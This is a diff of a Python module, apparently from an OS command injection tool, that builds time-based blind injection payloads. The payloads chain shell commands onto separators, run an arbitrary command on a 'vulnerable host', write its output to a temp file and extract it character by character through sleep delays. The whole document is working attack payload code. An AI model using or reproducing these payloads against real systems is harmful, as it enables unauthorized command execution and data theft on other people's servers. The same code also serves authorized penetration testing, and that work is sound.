@@ -21,7 +21,9 @@ import urllib
   The available "tempfile-based" payloads.
 """
 
+#----------------------------------------------------------------
 # Tempfile-based decision payload (check if host is vulnerable).
+#----------------------------------------------------------------
 def decision(separator,j,TAG,OUTPUT_TEXTFILE,delay,http_request_method):
   if separator == ";" :
     payload = (separator + " "
@@ -63,18 +65,19 @@ def decision(separator,j,TAG,OUTPUT_TEXTFILE,delay,http_request_method):
 
   return payload
 
-# Tempfile-based decision payload (check if host is vulnerable).
-#  __Warning__: This (alternative) python-shell is still experimental.
+"""
+__Warning__: The alternative shells are still experimental.
+"""
 def decision_alter_shell(separator,j,TAG,OUTPUT_TEXTFILE,delay,http_request_method):
   
   if separator == ";" :
     payload = (separator + " "
-	      "str=$(echo " + TAG + " > " + OUTPUT_TEXTFILE + ")" + separator + " "
+	      "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "','w')\nf.write('"+ TAG + "')\")" + separator + " "
 	      # Find the length of the output, using readline().
-	      "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())-1\")"+ separator + " "
+	      "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\")"+ separator + " "
 	      "if [ \"" + str(j) + "\" -ne ${str1} ]" + separator  + " "
-	      "then $(python -c \"import time;time.sleep(0)\")"+ separator + " "
-	      "else $(python -c \"import time;time.sleep("+ str(delay) +")\")"+ separator + " "
+	      "then $(python -c \"import time\ntime.sleep(0)\")"+ separator + " "
+	      "else $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"+ separator + " "
 	      "fi "
 	      )
 
@@ -85,37 +88,39 @@ def decision_alter_shell(separator,j,TAG,OUTPUT_TEXTFILE,delay,http_request_meth
     else:
       ampersand = "&"
     payload = (ampersand + " " +
-	      "$(python -c \"import time;time.sleep(0)\") " + separator + " "
-	      "str=$(echo "+ TAG + " > " + OUTPUT_TEXTFILE + ") " + separator + " "
+	      "$(python -c \"import time\ntime.sleep(0)\") " + separator + " "
+	      "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "','w')\nf.write('"+ TAG + "')\")" + separator + " "
 	      # Find the length of the output, using readline().
-	      "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())-1\") " + separator + " "
+	      "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") " + separator + " "
 	      "[ " + str(j) + " -eq ${str1} ] " + separator + " "
-	      "$(python -c \"import time;time.sleep("+ str(delay) +")\") "
+	      "$(python -c \"import time\ntime.sleep("+ str(delay) +")\") "
 	      )
     if http_request_method == "POST":
       separator = urllib.unquote(separator)
 
   elif separator == "||" :
     payload = (separator + " "
-	      "echo '" + TAG + "' > " + OUTPUT_TEXTFILE + " | "+ 
+	      "echo $(python -c \"f = open('" + OUTPUT_TEXTFILE + "','w')\nf.write('"+ TAG + "')\")" + " | "+ 
 	      # Find the length of the output, using readline().
-	      "[ " + str(j) + " -ne $(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())-1\") ] " + separator + " "
-	      "$(python -c \"import time;time.sleep(0)\") | $(python -c \"import time;time.sleep("+ str(delay) +")\")"
+	      "[ " + str(j) + " -ne $(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") ] " + separator + " "
+	      "$(python -c \"import time\ntime.sleep(0)\") | $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"
 	      ) 
   else:
     pass
   
   return payload
 
+#-----------------------------------------------
 # Execute shell commands on vulnerable host.
+#-----------------------------------------------
 def cmd_execution(separator,cmd,j,OUTPUT_TEXTFILE,delay,http_request_method):
   if separator == ";" :
     payload = (separator + " "
 	      "str=$("+ cmd + " > " + OUTPUT_TEXTFILE + ")" + separator + " "
 	      "str=$(cat " + OUTPUT_TEXTFILE + ")" + separator + " "
-	      "str1=${#str}" + separator +
-	      "if [ \"" + str(j) + "\" != ${str1} ]; " +
-	      "then sleep 0" + separator +
+	      "str1=${#str}" + separator + " "
+	      "if [ \"" + str(j) + "\" != ${str1} ] " + separator + " "
+	      "then sleep 0 " + separator +
 	      "else sleep " + str(delay) + separator +
 	      "fi "
 	      )
@@ -149,17 +154,18 @@ def cmd_execution(separator,cmd,j,OUTPUT_TEXTFILE,delay,http_request_method):
   
   return payload
 
-# Execute shell commands on vulnerable host.
-# __Warning__: This (alternative) python-shell is still experimental.
+"""
+__Warning__: The alternative shells are still experimental.
+"""
 def cmd_execution_alter_shell(separator,cmd,j,OUTPUT_TEXTFILE,delay,http_request_method):
   if separator == ";" :
     payload = (separator + " "
-	      "str=$("+ cmd + "| tr '\n' ' ' > " + OUTPUT_TEXTFILE + ")" + separator + " "
+	      "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "','w')\nf.write('$(echo $("+cmd+"))')\")" + separator + " "
 	      # Find the length of the output, using readline().
-	      "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())-1\")"+ separator + " "
-	      "if [ \"" + str(j) + "\" != ${str1} ]; " +
-	      "then $(python -c \"import time;time.sleep(0)\")"+ separator + " "
-	      "else $(python -c \"import time;time.sleep("+ str(delay) +")\")"+ separator + " "
+	      "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\")"+ separator + " "
+	      "if [ \"" + str(j) + "\" != ${str1} ] " + separator +
+	      "then $(python -c \"import time\ntime.sleep(0)\")"+ separator + " "
+	      "else $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"+ separator + " "
 	      "fi "
 	      )
     
@@ -170,29 +176,31 @@ def cmd_execution_alter_shell(separator,cmd,j,OUTPUT_TEXTFILE,delay,http_request
     else:
       ampersand = "&"
     payload = (ampersand + " " +
-	      "$(python -c \"import time;time.sleep(0)\") " +  separator + " "
-	      "str=$(\""+cmd+"\" > " + OUTPUT_TEXTFILE +") " +  separator + " "
+	      "$(python -c \"import time\ntime.sleep(0)\") " +  separator + " "
+	      "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "','w')\nf.write('$(echo $("+cmd+"))')\")" +  separator + " "
 	      # Find the length of the output, using readline().
-	      "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())-1\") " +  separator + " "
+	      "str1=$(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") " +  separator + " "
 	      "[ " + str(j) + " -eq ${str1} ] " +  separator + " "
-	      "$(python -c \"import time;time.sleep("+ str(delay) +")\") "
+	      "$(python -c \"import time\ntime.sleep("+ str(delay) +")\") "
 	      )
     if http_request_method == "POST":
       separator = urllib.unquote(separator)
     
   elif separator == "||" :		
     payload = (separator + " "
-	      "echo $(" + cmd + ") > " + OUTPUT_TEXTFILE + " | "+ 
+	      "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "','w')\nf.write('$(echo $("+cmd+"))')\")" + " | "+ 
 	      # Find the length of the output, using readline().
-	      "[ " + str(j) + " -ne $(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())-1\") ] " + separator + " "
-	      "$(python -c \"import time;time.sleep(0)\") | $(python -c \"import time;time.sleep("+ str(delay) +")\")"
+	      "[ " + str(j) + " -ne $(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") ] " + separator + " "
+	      "$(python -c \"import time\ntime.sleep(0)\") | $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"
 	      ) 		    
   else:
     pass
 
   return payload
 
+#---------------------------------------------------
 # Get the execution ouput, of shell execution.
+#---------------------------------------------------
 def get_char(separator,OUTPUT_TEXTFILE,i,ascii_char,delay,http_request_method):
   if separator == ";" :
     payload = (separator + " "
@@ -228,16 +236,17 @@ def get_char(separator,OUTPUT_TEXTFILE,i,ascii_char,delay,http_request_method):
 
   return payload
 
-# Get the execution ouput, of shell execution.
-# __Warning__: This (alternative) python-shell is still experimental.
+"""
+__Warning__: The alternative shells are still experimental.
+"""
 def get_char_alter_shell(separator,OUTPUT_TEXTFILE,i,ascii_char,delay,http_request_method):
   
   if separator == ";" :
     payload = (separator + " "
-	      "str=$(python -c \"with open('"+OUTPUT_TEXTFILE+"') as file: print ord(file.readlines()[0]["+str(i-1)+"]);exit(0)\")" + separator +
+	      "str=$(python -c \"with open('"+OUTPUT_TEXTFILE+"') as file: print ord(file.readlines()[0]["+str(i-1)+"])\nexit(0)\")" + separator +
 	      "if [ \"" + str(ascii_char) + "\" != ${str} ]" + separator +
-	      "then $(python -c \"import time;time.sleep(0)\")"+ separator + " "
-	      "else $(python -c \"import time;time.sleep("+ str(delay) +")\")"+ separator + " "
+	      "then $(python -c \"import time\ntime.sleep(0)\")"+ separator + " "
+	      "else $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"+ separator + " "
 	      "fi "
 	      )
     
@@ -248,18 +257,18 @@ def get_char_alter_shell(separator,OUTPUT_TEXTFILE,i,ascii_char,delay,http_reque
     else:
       ampersand = "&"
     payload = (ampersand + " " +
-	      "$(python -c \"import time;time.sleep(0)\") " +  separator + " "
-	      "str=$(python -c \"with open('"+OUTPUT_TEXTFILE+"') as file: print ord(file.readlines()[0]["+str(i-1)+"]);exit(0)\") " +  separator + " "
+	      "$(python -c \"import time\ntime.sleep(0)\") " +  separator + " "
+	      "str=$(python -c \"with open('"+OUTPUT_TEXTFILE+"') as file: print ord(file.readlines()[0]["+str(i-1)+"])\nexit(0)\") " +  separator + " "
 	      "[ " + str(ascii_char) + " -eq ${str} ] " +  separator + " "
-	      "$(python -c \"import time;time.sleep("+ str(delay) +")\")"
+	      "$(python -c \"import time\ntime.sleep("+ str(delay) +")\")"
 	      )
     if http_request_method == "POST":
       separator = urllib.unquote(separator)
 
   elif separator == "||" :
     payload = (separator + " "
-	      "[ \"" + str(ascii_char) + "\" -ne  $(python -c \"with open('"+OUTPUT_TEXTFILE+"') as file: print ord(file.readlines()[0]["+str(i-1)+"]);exit(0)\") ] " + separator + 
-	      "$(python -c \"import time;time.sleep(0)\") | $(python -c \"import time;time.sleep("+ str(delay) +")\")"
+	      "[ \"" + str(ascii_char) + "\" -ne  $(python -c \"with open('"+OUTPUT_TEXTFILE+"') as file: print ord(file.readlines()[0]["+str(i-1)+"])\nexit(0)\") ] " + separator + 
+	      "$(python -c \"import time\ntime.sleep(0)\") | $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"
 	      )
     
   else:
